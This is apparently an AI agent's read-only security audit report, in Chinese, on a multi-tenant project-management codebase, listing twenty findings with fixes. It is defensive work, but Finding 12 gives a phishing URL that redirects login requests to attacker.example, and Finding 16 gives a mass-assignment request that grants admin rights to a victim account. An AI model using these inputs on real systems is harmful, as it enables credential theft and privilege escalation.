# CGC-PMS 全量代码审计报告（2026-07-07）

## 1. 审计结论

- **总体结论：不通过，存在上线阻断项。**
- **最高风险级别：P0。**
- **本次为只读审计**：除写入本报告外，未修复业务代码。
- **过程偏差**：`CLAUDE.md` 要求先读取 `docs/prompt/code-audit-agent.md`，但该文件在当前仓库不存在；`docs/prompt/README.md` 也未登记代码审计 prompt。本次按用户“执行一次全量代码审计”和仓库审计报告落盘规则执行。
- **并行审计说明**：审计期间并行代理多次受到平台 `429` 并发限制；后续改为主线程串行抽查并合并已完成代理结论。

## 2. 审计范围

覆盖范围包括：

- 后端：认证鉴权、租户隔离、业务授权、文件服务、审批回调、项目/合同/采购/库存/成本相关服务。
- 前端：API 请求封装、路由/权限、项目台账和采购申请相关页面、E2E 配置。
- 数据库与迁移：Flyway MySQL/H2 脚本、新增 V132 字典种子。
- 部署与运维：Docker Compose、Dockerfile、生产 `.env`、备份脚本、监控栈、CI。
- 测试与构建：Maven/Surefire/JaCoCo、Vitest/Playwright、CI 作业、重建脚本。

## 3. 上线阻断项（必须优先修复）

1. **[P0]** 工作流 Mapper 原生 SQL 绕过租户过滤，可跨租户查询/物理删除审批实例。
2. **[P1]** 默认 `dev` profile + dev-login 免密超级管理员入口。
3. **[P1]** 登录阶段租户插件静默回退 `tenant_id=0`，非 0 租户用户可能无法登录。
4. **[P1]** 非 PROJECT 业务附件只校验租户，缺少对象级/项目级授权。
5. **[P1]** 付款回写未校验付款申请审批状态，可对草稿/驳回申请创建 SUCCESS 付款记录。
6. **[P1]** `SysUserService.update` 使用实体直写，客户端可通过 PUT 覆盖 `isAdmin`/`status` 等受保护字段。
7. **[P1]** 付款申请未校验 `projectId` 与 `contractId` 归属一致，可跨项目错账。
8. **[P1]** 本地生产 `.env` 存在开发密钥、默认 root 用户名和 root/app 同密码风险。
9. **[P1]** 生产 MySQL TLS 证书校验配置不闭环，且保留 `allowPublicKeyRetrieval=true`。
10. **[P2]** E2E 认证状态文件被 Git 跟踪，测试会复用旧 token 绕过真实登录。
11. **[P2]** 备份调度脚本吞掉备份失败，监控/cron/systemd 会误判成功。

---

## 4. 详细发现

### 发现 1 — P1：默认配置暴露免密 dev-login 超级管理员会话

- **类别**：authentication bypass / broken access control
- **位置**：
  - `backend/src/main/resources/application.yml:8-9`
  - `backend/src/main/resources/application-dev.yml:67-70`
  - `backend/src/main/java/com/cgcpms/auth/config/SecurityConfig.java:86-88`
  - `backend/src/main/java/com/cgcpms/auth/config/SecurityConfig.java:99-100`
- **摘要**：基础配置默认激活 `dev` profile，而 dev profile 默认开启 `auth.dev-login.enabled: true`。
- **失败/攻击场景**：如果开发、演示、临时容器、裸 JAR 或错误的生产启动命令未显式设置 `SPRING_PROFILES_ACTIVE=prod`，应用会进入 `dev` profile；未认证请求访问 `GET /api/auth/dev-login` 即可获得默认开发超级管理员会话。若接口支持 `username` 参数，还可能对任意已存在用户免密登录。
- **证据**：
  - `application.yml:8-9`：`spring.profiles.active: dev`。
  - `application-dev.yml:67-70`：`auth.dev-login.enabled: true`，默认用户为 `demo_dev_super_admin`。
  - `SecurityConfig.java:86-88`：当 `isDevLoginExposed()` 为真时，`GET /auth/dev-login` 被 `permitAll()`。
  - `SecurityConfig.java:99-100`：暴露条件只依赖 `devLoginEnabled && profile in {dev, local}`。
- **修复建议**：
  1. 移除 `application.yml` 中默认 `dev` profile，要求所有环境显式设置 profile。
  2. 将 `application-dev.yml` 的 `auth.dev-login.enabled` 默认改为 `false`，仅本机开发显式开启。
  3. 对 dev-login 增加 loopback/IP 白名单限制，并删除任意用户名免密登录能力。
  4. 生产 entrypoint 增加 fail-fast：未设置 `SPRING_PROFILES_ACTIVE=prod` 直接退出。

---

### 发现 2 — P1：非 PROJECT 业务附件只校验租户，存在同租户横向越权

- **类别**：broken access control / IDOR
- **位置**：
  - `backend/src/main/java/com/cgcpms/file/auth/BusinessObjectAuthorizer.java:84-207`
  - `backend/src/main/java/com/cgcpms/file/service/FileService.java:139-148`
  - `backend/src/main/java/com/cgcpms/file/service/FileService.java:192-211`
  - `backend/src/main/java/com/cgcpms/file/controller/FileController.java:36-58`
- **摘要**：文件服务在下载 URL、列表、删除前会调用业务对象授权器，但除 `PROJECT` 外，`CONTRACT`、`INVOICE`、`PAYMENT`、`SETTLEMENT`、`VARIATION`、`PARTNER`、`MATERIAL` 等分支基本只校验对象存在且 `tenantId` 等于当前租户。
- **失败/攻击场景**：同一租户内，用户 A 只负责项目 1，但拥有 `file:query`。若猜到项目 2 的合同 ID，可请求 `GET /api/files?businessType=CONTRACT&businessId=<合同ID>`。当前 `CONTRACT` 分支只检查合同租户一致，不校验该合同所属项目是否在用户数据范围内，最终返回附件列表及预签名下载 URL。若用户还拥有 `file:upload` 或 `file:delete`，可对其他项目业务附件上传或删除。
- **证据**：
  - `BusinessObjectAuthorizer.java:85-87`：只有 `PROJECT` 分支调用 `projectAccessChecker.checkAccess(...)`。
  - `BusinessObjectAuthorizer.java:88-207`：其他业务类型分支只做 `selectById` 和 `tenantId` 比较。
  - `FileService.java:139-148`：生成下载 URL 前调用 `authorizer.checkReadAccess(...)`。
  - `FileService.java:192-211`：按业务对象列文件后直接生成预签名 URL。
  - `FileController.java:51-58`：控制器只要求全局 `file:query` 权限，没有业务对象级补充授权。
- **修复建议**：
  1. 每个 `businessType` 补齐对象级授权；不能只校验租户。
  2. 对带 `projectId` 的对象优先复用 `ProjectAccessChecker`。
  3. 读写权限分离：写入/删除应校验对象编辑或附件管理权限，而不是复用可读判断。
  4. 对主数据类对象（如 `PARTNER`、`MATERIAL`）新增领域授权器或明确只允许管理员操作附件。

---

### 发现 3 — P1：本地生产 `.env` 存在弱/开发密钥与高风险默认账号

- **类别**：secret management / deployment security
- **位置**：
  - `deploy/.env:1-13`
  - `deploy/docker-compose.prod.yml:48-63`
- **摘要**：本地 `deploy/.env` 包含生产环境密钥；其中 Jasypt 使用开发口令，MinIO root 用户名为默认 `admin`，且 MySQL root/app 密码相同。虽然 `.gitignore` 已忽略 `.env`，但本地/目标机泄露仍会造成实际生产风险。
- **失败/攻击场景**：如果该 `.env` 被复制到生产机、备份、工单截图、终端历史或主机读权限泄露，攻击者可复用开发 Jasypt 口令解密配置；`admin` root 用户名降低 MinIO 爆破成本；MySQL root 与应用用户同密码会放大应用侧泄露后的数据库管理权限影响。
- **证据**：
  - `deploy/.env:1-5`：MySQL root 与应用用户使用相同密码值。
  - `deploy/.env:10`：`JASYPT_ENCRYPTOR_PASSWORD=dev-jasypt-key`。
  - `deploy/.env:12`：`MINIO_ROOT_USER=admin`。
  - `docker-compose.prod.yml:48-63`：preflight 只检查非空、非 `CHANGE-ME`，不会拦截 `dev-jasypt-key`、`admin`、root/app 同密码。
- **修复建议**：
  1. 立即轮换本地/目标机中的 JWT、Jasypt、MySQL、Redis、MinIO 密钥。
  2. MySQL root 与应用用户使用不同随机密码；MinIO root 用户名改为不可猜测值。
  3. preflight 增加已知弱值拦截：`dev-jasypt-key`、`admin`、root/app 同密码、过短密码。
  4. 确认该 `.env` 未被上传到任何制品、备份或远程主机共享位置。

---

### 发现 4 — P1：生产 MySQL TLS 配置声称校验证书，但未闭环 truststore/CA，且允许公钥获取

- **类别**：transport security / deployment reliability
- **位置**：
  - `backend/src/main/resources/application-prod.yml:3`
  - `deploy/docker-compose.prod.yml:205-208`
- **摘要**：生产 JDBC URL 使用 `useSSL=true&requireSSL=true&verifyServerCertificate=true&allowPublicKeyRetrieval=true`，但 Compose 未给后端挂载 CA/truststore；同时保留 `allowPublicKeyRetrieval=true`。
- **失败/风险场景**：上线时可能因 MySQL 自签证书或信任链配置缺失导致数据库 TLS 握手失败，后端健康检查长期失败；若后续为“修启动”关闭证书校验或继续保留 `allowPublicKeyRetrieval=true`，会削弱数据库认证链路，增加中间人/错误目标库连接风险。
- **证据**：
  - `application-prod.yml:3`：默认生产 JDBC URL 含 `verifyServerCertificate=true&allowPublicKeyRetrieval=true`。
  - `docker-compose.prod.yml:205-208`：Compose 注释声称 MySQL 自签证书会被 JDBC 默认信任，但没有挂载 CA/truststore。
- **修复建议**：
  1. 使用 CA 签发的 MySQL 服务端证书，并把 CA/truststore 只读挂载到后端容器。
  2. JDBC URL 改为明确证书校验模式，例如 `sslMode=VERIFY_IDENTITY`，并配置 truststore。
  3. 生产移除 `allowPublicKeyRetrieval=true`；仅本地开发保留。

---

### 发现 5 — P2：E2E 认证状态文件被 Git 跟踪，global setup 会复用旧 token 跳过登录

- **类别**：test false positive / credential leakage
- **位置**：
  - `frontend-admin/e2e/global-auth.setup.ts:4-10`
  - `frontend-admin/e2e/.auth/admin.json:4`
  - `frontend-admin/e2e/.auth/admin.json:14`
- **摘要**：`global-auth.setup.ts` 在 `e2e/.auth/admin.json` 存在时直接 `return`；该认证状态文件已被 Git 跟踪，且包含 refresh/access token 字段。
- **失败场景**：登录流程、CSRF、权限刷新或 cookie 写入逻辑回归时，Playwright 仍复用仓库中的旧 storage state，绕过真实登录；token 过期、签名密钥变化或用户权限变化时又可能出现环境相关假红/假绿。
- **证据**：
  - `frontend-admin/e2e/global-auth.setup.ts:4`：认证状态文件固定为 `e2e/.auth/admin.json`。
  - `frontend-admin/e2e/global-auth.setup.ts:8-10`：文件存在即跳过登录。
  - `git ls-files frontend-admin/e2e/.auth/admin.json` 有输出，说明文件已被跟踪。
  - `frontend-admin/e2e/.auth/admin.json:4`、`:14` 含 token 字段。
- **修复建议**：
  1. 从仓库移除 `frontend-admin/e2e/.auth/admin.json`，加入 `.gitignore`。
  2. CI 中强制重新登录，或校验 token 有效期、环境和用户权限后才复用。
  3. 对登录、刷新、权限恢复保留独立 E2E，不使用预置 storage state。

---

### 发现 6 — P2：`scripts/rebuild.py --test` 吞掉 lint 失败并打印 OK

- **类别**：test false positive / build tooling
- **位置**：`scripts/rebuild.py:189-191`
- **摘要**：前端测试流程运行 `pnpm lint` 时传入 `check=False`，非零退出码不会导致脚本失败，并无条件打印 `lint 完成`。
- **失败场景**：ESLint 检出真实错误并返回非零，`rebuild.py --test` 仍继续执行；只要 type-check 和 unit test 通过，整体脚本会被误认为验证通过。
- **证据**：
  - `scripts/rebuild.py:190`：`run(["pnpm", "lint"], ..., check=False)`。
  - `scripts/rebuild.py:191`：无条件打印 `[OK] lint 完成`。
  - 项目记忆已有“Linter 非零退出码不是命令失败”的历史陷阱，此处正好会制造假绿。
- **修复建议**：
  1. 将 lint 拆成 `lint:check` 和 `lint:fix`。
  2. `--test` 路径使用 `check=True` 的只检查命令。
  3. 若保留自动修复，应修复后再次运行检查并按退出码失败。

---

### 发现 7 — P2：备份调度脚本吞掉备份/校验失败，cron/systemd 会误判成功

- **类别**：backup reliability / ops observability
- **位置**：
  - `scripts/backup-scheduler.sh:19-27`
  - `scripts/backup-scheduler.sh:30-38`
  - `scripts/backup-scheduler.sh:41-49`
  - `scripts/backup-scheduler.sh:74`
- **摘要**：`backup-scheduler.sh` 中各备份函数用 `cmd && log success || log failed`，失败后执行 `log failed` 返回 0；脚本末尾仍打印 finished，不汇总失败状态。
- **失败场景**：MySQL dump、MinIO mirror 或备份校验失败时，日志里有 FAILED，但 systemd timer/cron 看到脚本退出 0，不会触发失败告警；可能连续多天没有可用备份，直到恢复演练或事故恢复时才发现。
- **证据**：
  - `backup-scheduler.sh:22-24`：MySQL 失败只写日志。
  - `backup-scheduler.sh:33-35`：MinIO 失败只写日志。
  - `backup-scheduler.sh:44-46`：校验失败只写日志。
  - `backup-scheduler.sh:74`：无条件打印 finished。
- **修复建议**：
  1. 维护失败计数，任一备份或校验失败最终 `exit 1`。
  2. systemd service 配置 `OnFailure=` 或日志告警。
  3. 定期做恢复演练，验证备份可恢复到隔离库。

---

### 发现 8 — P2：前端生产镜像健康检查依赖 `curl`，但 runtime 阶段未安装

- **类别**：deployment reliability
- **位置**：
  - `frontend-admin/Dockerfile:24`
  - `frontend-admin/Dockerfile:42-43`
  - `deploy/docker-compose.prod.yml:260-264`
- **摘要**：前端 runtime 镜像是 `nginx:1.27-alpine`，Dockerfile 没有安装 `curl`，但 Dockerfile 和生产 Compose 的 healthcheck 都执行 `curl -f http://localhost:80/`。
- **失败场景**：容器实际能提供页面，但 healthcheck 因 `curl: not found` 持续失败；如果编排平台或发布脚本依赖健康状态，会触发错误重启、错误告警或阻断发布。
- **证据**：
  - `frontend-admin/Dockerfile:24`：runtime stage 为 `nginx:1.27-alpine`。
  - `frontend-admin/Dockerfile:42-43`：healthcheck 使用 `curl`。
  - `deploy/docker-compose.prod.yml:260-264`：生产 Compose 也使用 `curl` 检查前端。
- **修复建议**：
  1. 在 runtime stage 安装 `curl`，或改用镜像内已有工具。
  2. CI 增加 Docker 镜像实际启动后的健康检查验证。

---

### 发现 9 — P2：生产 Docker 构建未复制 `public/`，容器产物与本地 Vite build 不一致

- **类别**：deployment artifact drift
- **位置**：
  - `frontend-admin/Dockerfile:16-18`
  - `frontend-admin/index.html:4`
- **摘要**：Dockerfile 只复制 `vite.config.ts`、`tsconfig*.json`、`index.html` 和 `src/`，但注释掉 `COPY public/ ./public/`；入口 HTML 引用 `/favicon.svg`。
- **失败场景**：本地构建可包含 `public/` 静态资源，生产容器构建时缺失，导致 `/favicon.svg` 等资源 404。若 `public/` 包含调试/mockup 文件，又存在复制进去会暴露非生产文件的相反风险，说明生产资产边界未明确。
- **证据**：
  - `frontend-admin/Dockerfile:16-18`：`COPY public/ ./public/` 被注释。
  - `frontend-admin/index.html:4`：引用 `/favicon.svg`。
- **修复建议**：
  1. 清理 `public/`，明确哪些是生产资产。
  2. 恢复 Docker 构建复制生产所需 `public/`。
  3. CI 比对本地 `pnpm build` 与 Docker 构建产物的静态资源完整性。

---

### 发现 10 — P2：CI E2E 下载了前端 dist，但 Playwright 实际启动 `pnpm dev`

- **类别**：test false positive / deployment validation gap
- **位置**：
  - `.github/workflows/ci.yml:254-272`
  - `frontend-admin/playwright.config.ts:23-25`
- **摘要**：E2E 作业下载 `frontend-dist` 到 `frontend-admin/dist`，但 Playwright 配置启动的是 Vite dev server，不验证下载的生产构建产物。
- **失败场景**：生产构建产物存在路径、静态资源、压缩、环境变量注入或 preview 行为问题时，CI E2E 仍在源码 dev server 上通过，不能证明 `frontend-build` artifact 可用。
- **证据**：
  - `.github/workflows/ci.yml:254-258`：下载 `frontend-dist`。
  - `.github/workflows/ci.yml:271-272`：运行 `pnpm exec playwright test`。
  - `playwright.config.ts:23-25`：`webServer.command` 是 `pnpm dev`，URL 为 `http://localhost:5173`。
- **修复建议**：
  1. CI E2E 改为 `pnpm preview --host 127.0.0.1` 或静态服务器服务 `dist`。
  2. 如果要测 dev server，则移除 dist 下载，并新增生产构建 smoke/E2E。

---

### 发现 11 — P2：MySQL 集成测试会被硬编码 `local` profile 测试绕回 H2

- **类别**：test coverage gap / database compatibility
- **位置**：
  - `.github/workflows/ci.yml:68-74`
  - `backend/src/test/resources/application-test.yml:4-9`
  - 多个后端测试类的 `@ActiveProfiles("local")`
- **摘要**：CI 的 `backend-test-mysql` 启动 MySQL 并传 `-Dspring.profiles.active=test`，但大量 Spring 测试类显式 `@ActiveProfiles("local")` 时会覆盖命令行 profile，改用 H2 local 配置。
- **失败场景**：MySQL 专属 SQL、Flyway MySQL migration、字符集/索引/锁行为出错时，在 H2 local profile 下仍可通过；CI 显示运行了 MySQL 作业，但关键测试未真正覆盖 MySQL。
- **证据**：
  - `.github/workflows/ci.yml:68-74`：MySQL 作业执行 `./mvnw -C test -Dspring.profiles.active=test` 并注入 MySQL datasource。
  - `backend/src/test/resources/application-test.yml:4-9`：test profile 才连接 MySQL。
  - 已完成测试审计代理发现多处 `@ActiveProfiles("local")` 使用 H2 local profile。
- **修复建议**：
  1. 将数据库相关测试拆分为明确的 H2 与 MySQL profile。
  2. MySQL CI 作业只运行 `test/mysql` profile 的测试，并禁止测试类硬编码 `local` 覆盖 CI profile。
  3. 增加 Flyway MySQL migration smoke，验证所有 MySQL 迁移可在空库执行。

---

### 发现 12 — P3：DEV 模式允许 URL 查询参数覆盖 API Base URL，可能诱导开发凭据外发

- **类别**：frontend dev security / configuration injection
- **位置**：
  - `frontend-admin/src/api/request.ts:16-20`
- **摘要**：DEV 模式下 `apiBaseUrl` 查询参数优先于运行时配置和环境变量。
- **误用场景**：开发人员运行 Vite DEV 前端后，被诱导访问 `http://dev-host:5173/login?apiBaseUrl=https://attacker.example/api`。登录请求会发往攻击者控制的 API；攻击者服务只需允许 CORS，即可接收开发人员输入的用户名密码。
- **证据**：
  - `request.ts:18`：DEV 下读取 `window.location.search` 的 `apiBaseUrl`。
  - `request.ts:20`：该值作为 `API_BASE_URL` 最高优先级。
- **修复建议**：删除 URL 查询参数覆盖能力；如确需调试，仅允许 `/api`、`localhost`、`127.0.0.1` 白名单。

---

### 发现 13 — P0：工作流 Mapper 原生 SQL 绕过租户过滤，可跨租户查询/物理删除审批实例

- **类别**：tenant isolation bypass / data leak
- **位置**：
  - `backend/src/main/java/com/cgcpms/workflow/mapper/WfInstanceMapper.java:25-35`
- **摘要**：`selectAllIncludingDeleted` 和 `hardDeleteById` 使用原生 `@Select`/`@Delete` SQL，WHERE 子句中不含 `tenant_id` 条件。注释声称"SUPER_ADMIN only"，但 Mapper 层无权限校验。
- **失败场景**：任何 Service/Mapper 层调用 `selectAllIncludingDeleted("CONTRACT_APPROVAL", 100L)` 可返回所有租户该 business key 的全部记录；`hardDeleteById(任意ID)` 可物理删除任意租户的审批实例。
- **证据**：
  - `WfInstanceMapper.java:25-27`：`@Select("SELECT * FROM wf_instance WHERE business_type = #{businessType} AND business_id = #{businessId}")`，无 `tenant_id`。
  - `WfInstanceMapper.java:34-35`：`@Delete("DELETE FROM wf_instance WHERE id = #{id}")`，无 `tenant_id`。
- **修复建议**：
  1. 两个 SQL 均需加入 `AND tenant_id = #{tenantId}` 参数。
  2. Service 层入口加 `requireCurrentTenant()` 校验。
  3. `hardDeleteById` 如仅限测试清理，应标记 `@Profile({"dev", "test"})` 或移入测试专用 Mapper。

---

### 发现 14 — P1：登录阶段租户插件静默回退 `tenant_id=0`，非 0 租户用户可能无法登录

- **类别**：authentication / tenant isolation
- **位置**：
  - `backend/src/main/java/com/cgcpms/config/MybatisPlusConfig.java:44-47`
  - `backend/src/main/java/com/cgcpms/auth/service/AuthService.java:46-62`
- **摘要**：`TenantLineInnerInterceptor.getTenantId()` 在 `UserContext.getCurrentTenantId() == null` 时硬编码返回 `new LongValue(0)`。登录接口在白名单中，JWT 过滤器不设置 `UserContext`，因此 `findUserByUsername()` 会被注入 `tenant_id = 0`。
- **失败场景**：用户 `alice` 的 `sys_user.tenant_id = 1`。POST `/auth/login` → JWT 过滤器跳过 → `UserContext` 为空 → `findUserByUsername()` 被注入 `WHERE tenant_id = 0` → 查不到 alice → "用户名或密码错误"。
- **证据**：
  - `MybatisPlusConfig.java:44-47`：`if (tenantId == null) { return new LongValue(0); }`。
  - `AuthService.java:46-62`：登录入口在认证前无 `UserContext`。
- **修复建议**：
  1. 登录请求应显式携带租户标识（如 `tenantCode`），或认证前 mapper 方法上使用 `@InterceptorIgnore(tenantLine = "true")`。
  2. 租户插件在 `UserContext` 为空时应 fail-close 而非静默使用 0。

---

### 发现 15 — P1：付款回写未校验付款申请审批状态，可对草稿/驳回申请创建 SUCCESS 付款记录

- **类别**：approval bypass / financial consistency
- **位置**：
  - `backend/src/main/java/com/cgcpms/payment/service/PayRecordService.java:62-127`
- **摘要**：`writeback()` 校验了付款申请存在性、合同余额、超付，但未校验 `PayApplication.approvalStatus == APPROVED`。拥有 `payment:record:writeback` 权限的用户可对草稿或已驳回的付款申请创建 SUCCESS 付款记录。
- **失败场景**：付款申请状态为 DRAFT 或 REJECTED → 用户调用 `POST /pay-records/writeback` → 只校验余额不检查审批状态 → 创建 `payStatus=SUCCESS` 的付款记录 → 级联更新合同已付金额和项目成本汇总。
- **证据**：
  - `PayRecordService.java:71-73`：只校验存在性和租户，无 `approvalStatus` 检查。
  - `PayRecordService.java:85-100`：只校验余额。
  - `PayRecordService.java:103-117`：直接创建 SUCCESS 记录。
- **修复建议**：在 `writeback()` 开头增加状态门禁：仅允许 `approvalStatus == APPROVED` 且 `payStatus in (APPROVED, PARTIALLY_PAID)`。

---

### 发现 16 — P1：`SysUserService.update` 使用实体直写，客户端可通过 PUT 覆盖 `isAdmin`/`status` 等受保护字段

- **类别**：privilege escalation / mass assignment
- **位置**：
  - `backend/src/main/java/com/cgcpms/system/service/SysUserService.java:111-122`
- **摘要**：`update` 方法接收 `@RequestBody SysUser user` 后直接 `sysUserMapper.updateById(user)`。`isAdmin`、`status` 等字段没有 `@JsonProperty(READ_ONLY)` 保护。
- **失败场景**：`PUT /api/system/users/123` + `{"username":"victim","isAdmin":1,"status":"DISABLE"}` → 将目标用户提权为 admin 并禁用其登录。
- **证据**：
  - `SysUserService.java:121`：`sysUserMapper.updateById(user)`，无字段白名单。
  - 对比 `CtContractService.update()` 使用 `LambdaUpdateWrapper` 白名单模式。
- **修复建议**：改用 `LambdaUpdateWrapper` 白名单字段更新，显式排除 `isAdmin`、`status`、`tenantId`、`password` 等受保护字段。

---

### 发现 17 — P1：付款申请未校验 `projectId` 与 `contractId` 归属一致，可跨项目错账

- **类别**：financial consistency / cross-project error
- **位置**：
  - `backend/src/main/java/com/cgcpms/payment/service/PayApplicationService.java:186-248`
  - `backend/src/main/java/com/cgcpms/payment/service/PayRecordService.java:107-124`
- **摘要**：付款申请创建/更新时未校验 `PayApplication.projectId` 是否等于关联合同 `CtContract.projectId`。付款回写时按 `contractId` 更新合同已付，按 `projectId` 更新项目成本汇总。
- **失败场景**：合同 C 属于项目 A → 创建付款申请填入 `contractId=C, projectId=B` → 合同 C 的 `paid_amount` 增加，但项目 B 的成本汇总被刷新 → "合同属于 A、付款成本记到 B"的跨项目错账。
- **证据**：
  - `PayApplicationService.java:186-198`：创建时仅设置租户并插入，未校验项目/合同关系。
  - `PayRecordService.java:107-109`：回写记录的 `contractId` 和 `projectId` 均来自付款申请。
- **修复建议**：在 `create()`、`update()`、`submitForApproval()` 增加 `validateProjectContractConsistency()`，要求 `Objects.equals(app.getProjectId(), contract.getProjectId())`。

---

### 发现 18 — P2：合同提交审批忽略乐观锁更新返回值，并发提交可能产生状态不一致

- **类别**：concurrency / state machine
- **位置**：
  - `backend/src/main/java/com/cgcpms/contract/service/CtContractService.java:254-273`
- **摘要**：`submitForApproval()` 使用 `version` 做乐观锁条件更新审批状态，但未检查返回行数。并发提交时，某个请求的状态更新返回 0 后仍继续调用 `workflowEngine.submit()`。
- **失败场景**：两个请求同时提交同一草稿合同 → 两者读到相同 version → A 成功 → B 的 `WHERE version=旧值` 返回 0 → B 未检查返回值继续提交工作流 → 触发唯一键异常或工作流实例与合同状态不一致。
- **证据**：
  - `CtContractService.java:254-260`：`ctContractMapper.update(null, updateWrapper)` 返回值被忽略。
  - `CtContractService.java:262-273`：无论更新是否成功都提交工作流。
- **修复建议**：检查 `int rows = ctContractMapper.update(...)`，`rows != 1` 时抛出 `CONTRACT_SUBMIT_CONFLICT`。对所有"先改业务状态再建工作流"的提交入口做同样处理。

---

### 发现 19 — P2：库存入库未校验仓库/物料存在性与租户归属，可创建孤儿库存记录

- **类别**：data integrity / orphan references
- **位置**：
  - `backend/src/main/java/com/cgcpms/inventory/service/MatStockService.java:67-104`
- **摘要**：`stockIn()` 在创建首条库存记录前只按当前租户查 `mat_stock`，但未校验 `warehouseId`、`materialId` 是否属于当前租户且有效。
- **失败场景**：当前租户用户传入另一个租户的 `warehouseId` 或已删除仓库 ID → `findStock()` 返回空 → 直接创建 `tenant_id=currentTenant, warehouse_id=无效ID` 的库存记录 → 库存台账、KPI、后续出库出现孤儿引用。
- **证据**：
  - `MatStockService.java:71-84`：未校验仓库/物料归属，库存不存在时直接 insert。
- **修复建议**：在 `stockIn()`/`stockOut()` 开头统一校验仓库存在（当前租户、启用状态）和物料存在（当前租户、未删除）。

---

### 发现 20 — P2：付款余额校验对缺失合同未判空，历史脏数据可触发 500

- **类别**：exception handling / NPE
- **位置**：
  - `backend/src/main/java/com/cgcpms/payment/service/PayApplicationService.java:275-302`
- **摘要**：`checkContractBalance()` 调用 `selectByIdForUpdate(contractId, tenantId)` 后直接访问 `contract.getCurrentAmount()`。如果合同不存在或已被删除，触发 NPE。
- **失败场景**：历史付款申请中存在 `contractId` 指向已删除合同 → `selectByIdForUpdate()` 返回 null → `contract.getCurrentAmount()` 触发 NPE → 接口返回 500。
- **证据**：
  - `PayApplicationService.java:280-282`：`CtContract contract = ctContractMapper.selectByIdForUpdate(contractId, tenantId)` 后未判空。
- **修复建议**：`selectByIdForUpdate()` 返回 null 时抛 `CONTRACT_NOT_FOUND` 业务异常。

---

## 5. 未纳入阻断但建议治理的问题

- 后端 JaCoCo 门槛为 instruction 73%、branch 53%，低于项目规则 80%（`backend/pom.xml:294-303`）。建议用”新增/变更代码 80%”先收敛。
- 前端 Vitest 覆盖率门槛只有 lines 10%、functions 8%、branches 10%、statements 10%（`frontend-admin/vitest.config.ts:21-27`）。建议分阶段提升并引入 changed-files coverage。
- `package.json:15` 的 `test:e2e:ui` 实际只跑单个 smoke spec，命名容易误导为完整 UI E2E。
- `deploy/docker-compose.monitoring.yml` 中 Prometheus 若用于生产，应避免 `9090:9090` 暴露所有网卡并禁用未鉴权 lifecycle 管理接口。
- 多数分页接口未统一限制 `pageSize` 上限；若未来暴露给非可信前端，建议在统一参数层加最大值。
- JWT Claims 中的权限在有效期内不反映数据库变更，建议后续专项评估 token 生命周期与权限版本号方案。
- Mapper XML 动态 SQL 未完整排查 `last()`、`${}`、原生 SQL、`@InterceptorIgnore` 使用点，建议专项扫描。

## 6. 本次未执行的验证

本次审计以静态证据和只读配置检查为主，未执行以下耗时验证：

- `./mvnw test` / `./mvnw verify`
- `pnpm test:coverage`
- `pnpm exec playwright test`
- Docker 镜像构建与容器健康检查
- 真实 MySQL 空库 Flyway 全量迁移

原因：用户请求为全量代码审计而非修复；同时仓库测试/容器验证耗时较长。上述命令应在修复阻断项后作为收口验证执行。

## 7. 建议修复顺序

1. **P0 租户隔离**：工作流 Mapper 原生 SQL 补充 `tenant_id` 条件（发现 13）。
2. **P1 安全与认证**：移除默认 dev profile、禁用 dev-login 默认开启、修复登录租户插件静默回退（发现 1、14）。
3. **P1 业务越权与财务一致性**：`SysUserService.update` 字段白名单（发现 16）、付款审批状态校验（发现 15）、付款项目/合同一致性（发现 17）、附件对象级授权（发现 2）。
4. **P1 部署安全**：轮换生产密钥（发现 3）、修复 MySQL TLS 信任链（发现 4）。
5. **P2 并发与数据完整性**：合同乐观锁返回值校验（发现 18）、库存入库校验（发现 19）、付款余额 NPE（发现 20）。
6. **P2 测试假绿与部署**：E2E auth state（发现 5）、备份脚本退出码（发现 7）、`rebuild.py` lint（发现 6）、前端健康检查/Docker 产物一致性（发现 8、9、10、11）。
7. **治理**：提升覆盖率门槛、分页上限、CI E2E dist/preview。

## 8. 正面观察

以下设计值得肯定：

- **审批任务 CAS + 幂等键**：`WorkflowApprovalService.validateAndCasUpdateTask()` 使用原子操作 + 幂等键防止重复提交，并发安全设计良好。
- **付款双重防线**：`submitForApproval()` 用 `REPEATABLE_READ` + 悲观锁 + `checkContractBalance`；`writeback()` 用 `selectByIdForUpdate` + 超付校验；两阶段口径互补。
- **库存乐观锁 + 并发重试**：`MatStockService.stockOut()` 使用 `@Version` 乐观锁 + 3 次重试 + 余量校验，防止负库存。
- **字段白名单更新**：`CtContractService.update()` 使用 `LambdaUpdateWrapper` 白名单模式，禁止客户端覆盖受保护字段——此模式应推广到其他 Service。
- **工作流模板表全租户共享**：`wf_template`/`wf_template_node` 在 `TenantLineInnerInterceptor.ignoreTable()` 中排除，配合 `tenant_id=0` 的模板为全局共享。
- **全局写限流**：`GlobalWriteRateLimitFilter` 防止暴力操作，为安全兜底。
- **文件类型联合校验**：`FileTypeValidator` 使用扩展名 + MIME + 魔术字节三元校验，20MB 大小限制，覆盖 PDF/JPEG/PNG/GIF/WebP/DOCX/XLSX/PPTX/TXT/CSV。
- **生产 Docker preflight**：`docker-compose.prod.yml` 的 preflight 容器在启动前校验所有必要密钥非空、非占位符、长度足够，有效防止错误部署。
- **供应链安全 CI**：CI 包含 SBOM 生成和 provenance attestation，前后端制品都有独立安全扫描。
